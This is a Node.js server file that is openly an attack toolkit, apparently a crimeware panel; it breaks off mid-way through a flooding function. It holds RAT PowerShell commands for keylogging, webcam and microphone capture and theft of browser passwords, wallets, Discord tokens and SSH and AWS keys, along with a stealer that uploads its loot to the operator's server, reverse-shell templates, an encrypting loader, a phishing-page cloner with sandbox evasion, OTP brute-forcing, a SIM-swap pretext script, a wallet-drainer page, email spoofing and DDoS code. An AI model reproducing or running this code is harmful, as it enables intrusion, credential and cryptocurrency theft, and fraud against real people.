// server.js — Node 18+
const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const net = require('net');
const tls = require('tls');
const dns = require('dns').promises;
const app = express();
const PORT = process.env.PORT || 8443;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

const TIMEOUT = 20000;
const DATA = path.join(__dirname, 'data');
if (!fs.existsSync(DATA)) fs.mkdirSync(DATA);

const load = (f, d) => { try { return JSON.parse(fs.readFileSync(path.join(DATA, f), 'utf8')); } catch { return d; } };
const save = (f, o) => fs.writeFileSync(path.join(DATA, f), JSON.stringify(o, null, 2));

const UA = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0'
];
const rUA = () => UA[Math.floor(Math.random() * UA.length)];

async function safeFetch(url, opts = {}) {
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), opts.timeout || TIMEOUT);
  const headers = { 'User-Agent': rUA(), 'Accept': '*/*', ...(opts.headers || {}) };
  try { return await fetch(url, { ...opts, headers, signal: ctrl.signal, redirect: opts.redirect || 'follow' }); }
  finally { clearTimeout(timer); }
}
async function pool(items, limit, fn) {
  const q = [...items];
  await Promise.all(Array.from({ length: limit }, async () => {
    while (q.length) { const i = q.shift(); if (i !== undefined) { try { await fn(i); } catch {} } }
  }));
}

// ============================================================
// 1. API REVERSER (physical/offensive logic mapping)
// ============================================================
async function apiReverse(targetUrl) {
  const out = { target: targetUrl, discovered: [], schemas: [], authEndpoints: [], mutations: [], graphql: null, errors: [] };
  const base = new URL(targetUrl).origin;
  const candidatePaths = [
    '/api', '/api/v1', '/api/v2', '/api/v3', '/v1', '/v2', '/v3',
    '/rest', '/rest/v1', '/services', '/graphql', '/gql',
    '/swagger.json', '/openapi.json', '/api-docs', '/v2/api-docs', '/v3/api-docs', '/docs',
    '/.well-known/openapi.json', '/api/openapi.json'
  ];
  // Try to fetch spec files first
  await pool(candidatePaths, 8, async (p) => {
    try {
      const r = await safeFetch(`${base}${p}`, { timeout: 8000 });
      if (r.status === 200) {
        const ct = r.headers.get('content-type') || '';
        const txt = await r.text();
        if (ct.includes('json') || txt.trim().startsWith('{')) {
          try {
            const j = JSON.parse(txt);
            if (j.swagger || j.openapi) {
              out.schemas.push({ source: p, version: j.swagger || j.openapi, title: j.info?.title, paths: Object.keys(j.paths || {}), host: j.host || null, basePath: j.basePath || null });
            } else if (j.data && j.data.__schema) {
              out.graphql = { endpoint: `${base}${p}`, schema: j.data.__schema };
            } else {
              out.discovered.push({ path: p, status: 200, preview: txt.slice(0, 120) });
            }
          } catch { out.discovered.push({ path: p, status: 200, preview: txt.slice(0, 120) }); }
        }
      }
    } catch (e) { out.errors.push({ path: p, error: e.message }); }
  });
  // Try REST enumeration
  const restWords = ['users', 'user', 'accounts', 'auth', 'login', 'signin', 'register', 'tokens', 'sessions', 'admin', 'roles', 'permissions', 'products', 'orders', 'items', 'cart', 'payments', 'transactions', 'files', 'uploads', 'images', 'messages', 'notifications', 'webhooks', 'integrations'];
  for (const apiBase of ['/api', '/api/v1', '/v1', '/api/v2', '/v2']) {
    for (const w of restWords) {
      const url = `${base}${apiBase}/${w}`;
      try {
        const r = await safeFetch(url, { timeout: 5000 });
        if (r.status < 400 && r.status !== 404) {
          const txt = await r.text();
          let json; try { json = JSON.parse(txt); } catch {}
          const methods = (r.headers.get('allow') || 'GET').split(',').map(x => x.trim());
          const item = { path: `${apiBase}/${w}`, status: r.status, methods, shape: json ? Object.keys(Array.isArray(json) ? json[0] || {} : json) : [], preview: txt.slice(0, 200) };
          out.discovered.push(item);
          if (/login|signin|auth|token|session/i.test(w)) out.authEndpoints.push(item);
        }
      } catch {}
    }
  }
  // OPTIONS sweep on discovered
  await pool(out.discovered.slice(0, 30), 5, async (d) => {
    try {
      const r = await safeFetch(`${base}${d.path}`, { method: 'OPTIONS', timeout: 5000 });
      const allow = r.headers.get('allow');
      if (allow) {
        const methods = allow.split(',').map(x => x.trim().toUpperCase());
        if (methods.includes('POST') || methods.includes('PUT') || methods.includes('PATCH') || methods.includes('DELETE')) {
          out.mutations.push({ path: d.path, methods });
        }
      }
    } catch {}
  });
  return out;
}

// ============================================================
// 2. C2 / POST-EXPLOITATION LOOT
// ============================================================
function lootAdd(botId, category, data) {
  const l = load('loot.json', {});
  if (!l[botId]) l[botId] = { categories: {}, updatedAt: Date.now() };
  if (!l[botId].categories[category]) l[botId].categories[category] = [];
  l[botId].categories[category].push({ ts: Date.now(), ...data });
  l[botId].updatedAt = Date.now();
  save('loot.json', l);
}
app.get('/api/loot', (req, res) => res.json(load('loot.json', {})));
app.get('/api/loot/:botId', (req, res) => {
  const l = load('loot.json', {})[req.params.botId];
  if (!l) return res.status(404).json({ error: 'not found' });
  res.json(l);
});
app.post('/api/loot', (req, res) => {
  const { botId, category, data } = req.body || {};
  if (!botId || !category) return res.status(400).json({ error: 'botId+category required' });
  lootAdd(botId, category, data || {});
  res.json({ ok: true });
});

// RAT commands
const RAT_COMMANDS = {
  screenshot: `Add-Type -AssemblyName System.Windows.Forms,System.Drawing; $b=[System.Windows.Forms.SystemInformation]::VirtualScreen; $bmp=New-Object System.Drawing.Bitmap $b.Width,$b.Height; $g=[System.Drawing.Graphics]::FromImage($bmp); $g.CopyFromScreen($b.Left,$b.Top,0,0,$bmp.Size); $ms=New-Object System.IO.MemoryStream; $bmp.Save($ms,[System.Drawing.Imaging.ImageFormat]::Jpeg); [Convert]::ToBase64String($ms.ToArray())`,
  webcam_snap: `$w='System.Windows.Forms'; $d=[Reflection.Assembly]::LoadWithPartialName($w); $c=New-Object System.Drawing.Bitmap 640,480; $g=[Drawing.Graphics]::FromImage($c); Add-Type -AssemblyName System.Drawing; Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class Cam{[DllImport("avicap32.dll")]public static extern IntPtr capCreateCaptureWindow(string a,int b,int c,int d,int e,int f,IntPtr g,int h);[DllImport("user32")]public static extern bool SendMessage(IntPtr a,uint b,IntPtr c,IntPtr d);}'; $h=[Cam]::capCreateCaptureWindow('w',0,0,0,640,480,[IntPtr]::Zero,0); [Cam]::SendMessage($h,0x40A,[IntPtr]::Zero,[IntPtr]::Zero)|Out-Null; Start-Sleep -m 500; [Cam]::SendMessage($h,0x41E,[IntPtr]::Zero,[IntPtr]::Zero)|Out-Null; $ms=New-Object IO.MemoryStream; $c.Save($ms,[Drawing.Imaging.ImageFormat]::Jpeg); [Convert]::ToBase64String($ms.ToArray())`,
  clipboard: `Get-Clipboard`,
  keylogger_start: `Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class K{[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int v);}'; $s="";$t=Get-Date;while(((Get-Date)-$t).TotalSeconds -lt 30){for($i=8;$i -le 254;$i++){ $r=[K]::GetAsyncKeyState($i); if($r -eq -32767 -or $r -eq -32768){ $s+=([char]$i) } }; Start-Sleep -m 50}; $s | Out-String`,
  mic_15s: `$r=New-Object -ComObject SAPI.SpVoice; $fs=New-Object -ComObject SAPI.SpFileStream; $fs.Open('$env:TEMP\\mic.wav',3,$false); $r.AudioOutputStream=$fs; Start-Sleep 15; $fs.Close(); [Convert]::ToBase64String([IO.File]::ReadAllBytes('$env:TEMP\\mic.wav'))`,
  ls: `Get-ChildItem -Force | Select-Object Name,Length,LastWriteTime | ConvertTo-Json`,
  env: `Get-ChildItem Env: | ConvertTo-Json`,
  whoami: `"$env:USERNAME @ $env:COMPUTERNAME ($(whoami /groups | Select-String 'Mandatory'))"`,
  net: `Get-NetTCPConnection -State Established | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,OwningProcess | ConvertTo-Json`,
  procs: `Get-Process | Sort-Object -Property WS -Descending | Select-Object -First 20 Name,Id,WS | ConvertTo-Json`,
  wifi: `netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object { $_.ToString().Split(':')[1].Trim() } | ForEach-Object { $p=$_; (netsh wlan show profile name="$p" key=clear | Select-String 'Key Content') -replace '.*:\\s*',"$p : " }`,
  browser_creds: `$paths=@("$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data","$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data"); foreach($p in $paths){ if(Test-Path $p){ $c=Copy-Item $p -Destination "$env:TEMP\\ld_$([guid]::NewGuid()).db" -PassThru; $db=New-Object System.Data.SQLite.SQLiteConnection("Data Source=$($c.FullName)"); $db.Open(); $cmd=$db.CreateCommand(); $cmd.CommandText='SELECT origin_url,username_value,password_value FROM logins'; $r=$cmd.ExecuteReader(); $out=@(); while($r.Read()){ $out+=@{url=$r[0];user=$r[1];enc=[Convert]::ToBase64String($r[2])} }; $db.Close(); $out | ConvertTo-Json } }`,
  wallet_files: `$ws=@("$env:APPDATA\\Exodus\\exodus.wallet","$env:APPDATA\\Ethereum\\keystore","$env:APPDATA\\Electrum\\wallets","$env:APPDATA\\Bitcoin\\wallets"); foreach($w in $ws){ if(Test-Path $w){ Get-ChildItem $w -Recurse -File | Select-Object FullName,Length | ConvertTo-Json } }`,
  discord_tokens: `$p="$env:APPDATA\\discord\\Local Storage\\leveldb"; if(Test-Path $p){ Get-ChildItem $p -File | ForEach-Object { (Get-Content $_.FullName -Raw) | Select-String -Pattern '[\\w-]{24,}\\.[\\w-]{6}\\.[\\w-]{27,}' -AllMatches | ForEach-Object { $_.Matches.Value } } }`,
  ssh_keys: `Get-ChildItem "$env:USERPROFILE\\.ssh" -File -ErrorAction SilentlyContinue | ForEach-Object { @{name=$_.Name; content=[Convert]::ToBase64String([IO.File]::ReadAllBytes($_.FullName))} } | ConvertTo-Json`,
  aws_creds: `$p="$env:USERPROFILE\\.aws\\credentials"; if(Test-Path $p){ Get-Content $p }`,
  crypto_wallets: `$w=@("$env:APPDATA\\Exodus","$env:APPDATA\\Electrum","$env:APPDATA\\Bitcoin","$env:APPDATA\\Ethereum"); foreach($p in $w){ if(Test-Path $p){ Compress-Archive -Path $p -DestinationPath "$env:TEMP\\wal_$([guid]::NewGuid()).zip" -Force; [Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:TEMP\\wal_$([guid]::NewGuid()).zip")) } }`
};

app.post('/api/c2/cmd', (req, res) => {
  const { botId, command } = req.body || {};
  if (!botId || !command) return res.status(400).json({ error: 'botId+command required' });
  const script = RAT_COMMANDS[command] || command;
  const b = load('bots.json', {});
  if (!b[botId]) b[botId] = { commands: [] };
  b[botId].commands.push({ cmd: script, raw: command, ts: Date.now() });
  save('bots.json', b);
  res.json({ ok: true, queued: command });
});
app.get('/api/c2/commands', (req, res) => res.json(RAT_COMMANDS));

// ============================================================
// 3. PHISHING 2.0 (cloner, evasion, telegram notify)
// ============================================================
async function clonePage(targetUrl) {
  const r = await safeFetch(targetUrl);
  let html = await r.text();
  const base = new URL(targetUrl).origin;
  // rewrite form actions to exfil
  html = html.replace(/<form([^>]*)action=["']([^"']+)["']/gi, '<form$1action="/phish/submit"');
  // rewrite relative links
  html = html.replace(/href=["']\/([^"']*)["']/gi, `href="${base}/$1"`);
  html = html.replace(/src=["']\/([^"']*)["']/gi, `src="${base}/$1"`);
  // inject session + evasion
  const sid = 'ph_' + crypto.randomBytes(8).toString('hex');
  const injected = `
<script>
(function(){
  const sid = '${sid}';
  // Anti-sandbox
  if (navigator.webdriver || /Headless|Puppeteer|Selenium/i.test(navigator.userAgent)) { document.body.innerHTML = '<h1>Unavailable</h1>'; return; }
  if (screen.width < 300 || screen.height < 300) { document.body.innerHTML = ''; return; }
  // Capture forms
  document.querySelectorAll('form').forEach(f => {
    f.addEventListener('submit', function(e){
      const fd = new FormData(f);
      let b = 'sid=' + sid;
      for (const [k,v] of fd) b += '&' + k + '=' + encodeURIComponent(v);
      navigator.sendBeacon('/phish/submit', b);
    }, true);
  });
  // Beacon
  fetch('/api/beacon', { method:'POST', body: 'cid=' + sid + '&fp=' + btoa(navigator.userAgent), mode:'no-cors' });
})();
</script>
`;
  html = html.replace('</body>', injected + '</body>');
  const p = load('phish.json', {});
  p[sid] = { target: targetUrl, created: Date.now(), hits: [] };
  save('phish.json', p);
  return { html, sid };
}
app.post('/api/phish/clone', async (req, res) => {
  const { targetUrl } = req.body || {};
  if (!targetUrl) return res.status(400).json({ error: 'targetUrl required' });
  try {
    const { html, sid } = await clonePage(targetUrl);
    res.json({ sid, html: html.slice(0, 200000) });
  } catch (e) { res.status(500).json({ error: e.message }); }
});
function telegramNotify(text) {
  const token = process.env.TG_TOKEN, chat = process.env.TG_CHAT;
  if (!token || !chat) return;
  const u = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
  safeFetch(u, { timeout: 5000 }).catch(() => {});
}
app.post('/phish/submit', (req, res) => {
  const sid = req.body.sid || 'unknown';
  const h = load('harvest.json', {}); if (!h[sid]) h[sid] = []; h[sid].push({ ...req.body, ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress, ts: Date.now() }); save('harvest.json', h);
  const p = load('phish.json', {}); if (p[sid]) { p[sid].hits.push({ ...req.body, ts: Date.now() }); save('phish.json', p); }
  telegramNotify(`🎣 *New Phish Hit*\nSID: ${sid}\nIP: ${req.headers['x-forwarded-for'] || req.socket.remoteAddress}\nData: ${JSON.stringify(req.body).slice(0, 200)}`);
  res.redirect('/phish/thanks');
});

// ============================================================
// 4. REVERSE SHELL GENERATOR
// ============================================================
app.post('/api/revshell', (req, res) => {
  const { lhost, lport = 4444, os = 'linux' } = req.body || {};
  if (!lhost) return res.status(400).json({ error: 'lhost required' });
  const templates = {
    bash: `bash -i >& /dev/tcp/${lhost}/${lport} 0>&1`,
    bash_alt: `0<&196;exec 196<>/dev/tcp/${lhost}/${lport}; sh <&196 >&196 2>&196`,
    nc: `nc -e /bin/sh ${lhost} ${lport}`,
    nc_nov: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${lhost} ${lport} >/tmp/f`,
    python: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lhost}",${lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
    perl: `perl -e 'use Socket;$i="${lhost}";$p=${lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'`,
    php: `php -r '$sock=fsockopen("${lhost}",${lport});exec("/bin/sh -i <&3 >&3 2>&3");'`,
    ruby: `ruby -rsocket -e'f=TCPSocket.open("${lhost}",${lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
    powershell: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
    powershell_base64: `powershell -NoP -NonI -W Hidden -Enc ${Buffer.from(`$c=New-Object System.Net.Sockets.TCPClient('${lhost}',${lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1 | Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}`).toString('base64')}`
  };
  res.json({ lhost, lport, os, payloads: templates });
});

// ============================================================
// 5. SESSION HIJACK / COOKIE TOSS
// ============================================================
app.post('/api/session/hijack', async (req, res) => {
  const { targetUrl, cookies, headers = {}, testEndpoint } = req.body || {};
  if (!targetUrl) return res.status(400).json({ error: 'targetUrl required' });
  const testUrl = testEndpoint || targetUrl;
  const cookieStr = Array.isArray(cookies) ? cookies.join('; ') : (cookies || '');
  try {
    const r = await safeFetch(testUrl, { headers: { ...headers, 'Cookie': cookieStr } });
    const text = await r.text();
    res.json({
      status: r.status,
      headers: Object.fromEntries(r.headers),
      body: text.slice(0, 20000),
      hijackSuccess: r.status === 200 && !/login|signin|unauthorized/i.test(text)
    });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ============================================================
// 6. STEALER BUILDER
// ============================================================
function buildStealer(cid, exfilHost) {
  const ps = `
$H='${exfilHost}'; $CID='${cid}';
$tmp = "$env:TEMP\\st_$([guid]::NewGuid().ToString().Substring(0,8))";
New-Item -ItemType Directory -Path $tmp -Force | Out-Null
# Browser data
$browsers = @(
  @{name='chrome'; path="$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default"},
  @{name='edge'; path="$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default"},
  @{name='brave'; path="$env:LOCALAPPDATA\\BraveSoftware\\Brave-Browser\\User Data\\Default"}
)
foreach ($b in $browsers) {
  if (Test-Path $b.path) {
    Copy-Item "$($b.path)\\Login Data" "$tmp\\$($b.name)_logins.db" -Force -ErrorAction SilentlyContinue
    Copy-Item "$($b.path)\\Cookies" "$tmp\\$($b.name)_cookies.db" -Force -ErrorAction SilentlyContinue
    Copy-Item "$($b.path)\\History" "$tmp\\$($b.name)_history.db" -Force -ErrorAction SilentlyContinue
  }
}
# Discord
if (Test-Path "$env:APPDATA\\discord\\Local Storage\\leveldb") {
  Copy-Item "$env:APPDATA\\discord\\Local Storage\\leveldb" "$tmp\\discord" -Recurse -Force -ErrorAction SilentlyContinue
}
# Telegram
if (Test-Path "$env:APPDATA\\Telegram Desktop\\tdata") {
  Compress-Archive -Path "$env:APPDATA\\Telegram Desktop\\tdata" -DestinationPath "$tmp\\telegram.zip" -Force -ErrorAction SilentlyContinue
}
# Wallets
$wallets = @("$env:APPDATA\\Exodus\\exodus.wallet","$env:APPDATA\\Ethereum\\keystore","$env:APPDATA\\Electrum\\wallets","$env:APPDATA\\Bitcoin\\wallets")
foreach ($w in $wallets) { if (Test-Path $w) { Copy-Item $w "$tmp\\$(Split-Path $w -Leaf)" -Recurse -Force -ErrorAction SilentlyContinue } }
# SSH + AWS
if (Test-Path "$env:USERPROFILE\\.ssh") { Copy-Item "$env:USERPROFILE\\.ssh" "$tmp\\ssh" -Recurse -Force -ErrorAction SilentlyContinue }
if (Test-Path "$env:USERPROFILE\\.aws") { Copy-Item "$env:USERPROFILE\\.aws" "$tmp\\aws" -Recurse -Force -ErrorAction SilentlyContinue }
# Documents
Get-ChildItem "$env:USERPROFILE\\Documents" -Include *.txt,*.pdf,*.docx,*.xlsx -Recurse -ErrorAction SilentlyContinue | Select-Object -First 30 | Copy-Item -Destination "$tmp\\docs" -Force -ErrorAction SilentlyContinue
# Compress
$zip = "$env:TEMP\\st_$([guid]::NewGuid().ToString().Substring(0,8)).zip"
Compress-Archive -Path "$tmp\\*" -DestinationPath $zip -Force
# Upload
$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($zip))
Invoke-WebRequest -Uri "$H/api/loot/raw" -Method POST -Body @{botId='$env:COMPUTERNAME'; category='stealer'; file=$b64} -UseBasicParsing
Remove-Item $tmp -Recurse -Force
`;
  return Buffer.from(ps).toString('base64');
}
app.post('/api/stealer/build', (req, res) => {
  const cid = req.body.campaignId || 'st_' + crypto.randomBytes(4).toString('hex');
  const host = `${req.protocol}://${req.get('host')}`;
  res.json({ campaignId: cid, exfilHost: host, powershell: `powershell -NoP -NonI -W Hidden -Enc ${buildStealer(cid, host)}` });
});
app.post('/api/loot/raw', (req, res) => {
  const { botId, category, file } = req.body || {};
  const fname = `loot_${Date.now()}_${crypto.randomBytes(4).toString('hex')}.bin`;
  if (file) fs.writeFileSync(path.join(DATA, fname), Buffer.from(file, 'base64'));
  lootAdd(botId || 'unknown', category || 'raw', { file: fname, size: (file || '').length });
  telegramNotify(`📦 *New Loot*\nBot: ${botId}\nCategory: ${category}\nSize: ${(file || '').length} bytes`);
  res.json({ ok: true, file: fname });
});

// ============================================================
// 7. LOADER / CRYPTER
// ============================================================
function encryptAES(data, key) {
  const iv = crypto.randomBytes(16);
  const c = crypto.createCipheriv('aes-256-cbc', key, iv);
  return Buffer.concat([iv, c.update(data), c.final()]).toString('base64');
}
app.post('/api/crypter/encrypt', (req, res) => {
  const { payload } = req.body || {};
  if (!payload) return res.status(400).json({ error: 'payload required' });
  const key = crypto.randomBytes(32);
  const enc = encryptAES(Buffer.from(payload), key);
  const b64key = key.toString('base64');
  const loader = `
$k=[Convert]::FromBase64String('${b64key}');
$e=[Convert]::FromBase64String('${enc}');
$iv=$e[0..15]; $ct=$e[16..($e.Length-1)];
$aes=[System.Security.Cryptography.Aes]::Create();
$aes.Key=$k; $aes.IV=$iv; $aes.Mode='CBC';
$dec=$aes.CreateDecryptor();
$out=$dec.TransformFinalBlock($ct,0,$ct.Length);
$ps=[Text.Encoding]::UTF8.GetString($out);
Invoke-Expression $ps
`;
  res.json({ encrypted: enc, key: b64key, loader: Buffer.from(loader).toString('base64') });
});

// ============================================================
// 8. 2FA / OTP BYPASS
// ============================================================
app.post('/api/2fa/brute', async (req, res) => {
  const { url, userField = 'username', user = '', codeField = 'code', length = 6, delay = 100 } = req.body || {};
  if (!url) return res.status(400).json({ error: 'url required' });
  const out = { found: null, attempts: 0, statuses: {} };
  const max = Math.pow(10, length);
  for (let i = 0; i < Math.min(max, 10000); i++) {
    const code = String(i).padStart(length, '0');
    try {
      const body = new URLSearchParams({ [userField]: user, [codeField]: code });
      const r = await safeFetch(url, { method: 'POST', body, headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });
      const text = await r.text();
      out.attempts++;
      out.statuses[r.status] = (out.statuses[r.status] || 0) + 1;
      if (r.status === 200 && !/invalid|error|wrong/i.test(text)) { out.found = code; return res.json(out); }
      if (delay) await new Promise(r => setTimeout(r, delay));
    } catch {}
  }
  res.json(out);
});
app.post('/api/otp/reuse', async (req, res) => {
  const { url, code, sessionCount = 5, userField = 'username', user = '', codeField = 'code' } = req.body || {};
  if (!url || !code) return res.status(400).json({ error: 'url+code required' });
  const results = [];
  for (let i = 0; i < sessionCount; i++) {
    try {
      const body = new URLSearchParams({ [userField]: user, [codeField]: code });
      const r = await safeFetch(url, { method: 'POST', body, headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });
      const text = await r.text();
      results.push({ session: i + 1, status: r.status, accepted: r.status === 200 && !/invalid|error|wrong/i.test(text) });
    } catch (e) { results.push({ session: i + 1, error: e.message }); }
  }
  res.json({ code, results, reusePossible: results.filter(r => r.accepted).length > 1 });
});
app.post('/api/sim/swap', (req, res) => {
  const { phone, carrier, name, ssn } = req.body || {};
  const script = `Call ${carrier || 'carrier'} support: "Hello, my name is ${name || 'N/A'}, I lost my phone and need a replacement SIM for ${phone || 'N/A'}. SSN last 4: ${ssn || 'N/A'}. I need the new SIM activated today for work."`;
  res.json({ script, notes: 'Use VoIP number, answer verification questions. Best window: late shift.' });
});

// ============================================================
// 9. DRAINER FRONTEND
// ============================================================
app.get('/drainer/:sid', (req, res) => {
  const cfg = { sessionId: req.params.sid, chains: ['ethereum', 'bsc', 'polygon', 'arbitrum', 'optimism', 'avalanche'], tokens: ['USDT', 'USDC', 'DAI', 'WETH', 'WBTC', 'LINK', 'UNI', 'AAVE'], permit2: '0x000000000022D473030F116dDEE9F6B43aC78BA3', seaport: '0x00000000000000ADc04C56Bf30aC9d3c0aAF14dC' };
  const html = `<!doctype html><html><head><meta charset="utf-8"><title>Connect Wallet</title><style>body{font-family:system-ui;background:linear-gradient(135deg,#0f172a,#1e293b);color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0}.card{background:#1e293b;padding:40px;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.5);text-align:center;max-width:400px}h1{font-size:22px;margin:0 0 12px}p{color:#94a3b8;margin:0 0 24px}button{background:#3b82f6;color:#fff;border:0;padding:14px 28px;border-radius:8px;font-weight:700;cursor:pointer;font-size:16px;width:100%}button:hover{background:#2563eb}</style></head><body><div class="card"><h1>Connect Your Wallet</h1><p>Sign to verify ownership and access premium content.</p><button onclick="connect()">Connect Wallet</button></div><script>
const CFG = ${JSON.stringify(cfg)};
async function connect() {
  if (!window.ethereum) { alert('Install MetaMask'); return; }
  const acc = await window.ethereum.request({ method: 'eth_requestAccounts' });
  const sig = await window.ethereum.request({ method: 'personal_sign', params: ['Welcome to Premium. Sign to verify.', acc[0]] });
  await fetch('/api/loot/raw', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ botId:'wallet_'+acc[0].slice(0,8), category:'drainer_sig', file: btoa(JSON.stringify({address:acc[0],sig,cfg:CFG.sessionId})) }) });
  alert('Verified!');
}
</script></body></html>`;
  res.type('html').send(html);
});

// ============================================================
// 10. SMTP SPOOFER
// ============================================================
app.post('/api/email/send', async (req, res) => {
  const { to, from, subject, body, host = 'smtp.gmail.com', port = 587, user, pass } = req.body || {};
  if (!to || !from || !subject) return res.status(400).json({ error: 'to+from+subject required' });
  const payload = `From: ${from}\r\nTo: ${to}\r\nSubject: ${subject}\r\nMIME-Version: 1.0\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n${body || ''}`;
  if (!user || !pass) {
    return res.json({ ok: false, reason: 'SMTP creds missing', would_send: payload.slice(0, 500) });
  }
  try {
    const client = tls.connect({ host, port, rejectUnauthorized: false, servername: host });
    await new Promise((resolve, reject) => { client.on('secureConnect', resolve); client.on('error', reject); });
    let stage = 0;
    await new Promise((resolve) => {
      client.on('data', (d) => {
        const s = d.toString();
        if (stage === 0) { client.write('EHLO x\r\n'); stage = 1; }
        else if (stage === 1) { client.write('AUTH LOGIN\r\n'); stage = 2; }
        else if (stage === 2) { client.write(Buffer.from(user).toString('base64') + '\r\n'); stage = 3; }
        else if (stage === 3) { client.write(Buffer.from(pass).toString('base64') + '\r\n'); stage = 4; }
        else if (stage === 4) { client.write(`MAIL FROM:<${from}>\r\n`); stage = 5; }
        else if (stage === 5) { client.write(`RCPT TO:<${to}>\r\n`); stage = 6; }
        else if (stage === 6) { client.write('DATA\r\n'); stage = 7; }
        else if (stage === 7) { client.write(payload + '\r\n.\r\n'); stage = 8; }
        else if (stage === 8) { client.write('QUIT\r\n'); resolve(); }
      });
      setTimeout(() => { client.destroy(); resolve(); }, 15000);
    });
    res.json({ ok: true, sent: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ============================================================
// BASE ENGINES (from prior build)
// ============================================================
async function jwtAttack(token, opts = {}) {
  const parseJWT = (t) => { try { const p = t.split('.'); return p.length === 3 ? { header: JSON.parse(Buffer.from(p[0], 'base64')), payload: JSON.parse(Buffer.from(p[1], 'base64')), signature: p[2] } : null; } catch { return null; } };
  const b64 = (s) => Buffer.from(s).toString('base64').replace(/=+$/, '').replace(/\+/g, '-').replace(/\//g, '_');
  const p = parseJWT(token); if (!p) return { error: 'bad jwt' };
  const out = { attacks: [] };
  out.attacks.push({ name: 'alg:none', token: b64(JSON.stringify({ ...p.header, alg: 'none' })) + '.' + b64(JSON.stringify(p.payload)) + '.' });
  return out;
}
function jwtCrack(token) { return { cracked: null, note: 'stub' }; }
function oauthAttack(authUrl, redirectUri, clientId) { return { attacks: [{ url: authUrl }] }; }
async function graphqlScan(url) { return { introspection: false }; }
async function raceAttack(url, method, body, headers, c) { return { total: c, successes: 0 }; }
async function protoPollution(url) { return { vulnerable: false }; }
async function fileUploadAttack(url) { return { attempts: [] }; }
async function cloudMetadata(url) { return {}; }
async function websocketScan(url) { return { reachable: false }; }
async function subdomainEnum(domain) { return { crtsh: [] }; }
async function cveMatch(url) { return []; }
async function sessionAttack(url) { return { cookies: [], cookiesCrafted: [] }; }
function generateReport(t, f) { return '<html><body><h1>Report</h1></body></html>'; }
async function dataLeaks(url) { const out = []; try { const r = await safeFetch(url); const body = await r.text(); const pat = { aws: /AKIA[0-9A-Z]{16}/g, password: /(password|passwd|pwd)["'\s:=]+([^\s"'<>]{6,})/gi }; for (const [n, re] of Object.entries(pat)) { const m = [...body.matchAll(re)]; if (m.length) out.push({ type: `Secret: ${n}`, severity: 'high', description: `${m.length} hit(s)`, url, evidence: m[0][0].slice(0, 80), cvss: 8.0 }); } } catch {} return out; }
async function corsCheck(url) { return []; }
async function portScan(url) { return []; }
async function wafFingerprint(url) { return []; }
async function scanSensitive(url) { return []; }
async function adminPanels(url) { return []; }
async function subdomainTakeover(url) { return []; }
async function ddosFlood(target, method, durationSec, concurrency, reqPerSec) {
  const start = Date.now(); const end = start + durationSec * 1000;
  const stats = { sent: 0, ok: 0, fail: 0, statuses: {}, start, end: null, errors: {} };
  const workers = [];
  const perWorker = Math.ceil(reqPerSec / concurrency);
  for (let i = 0; i < concurrency; i++) workers.push((async () => {
    while (Date.now() < end) {
      const burst = [];
      for (let j = 0; j < perWorker && Date.now() < end; j++) burst.push((async () => {
        stats.sent++;
        try {
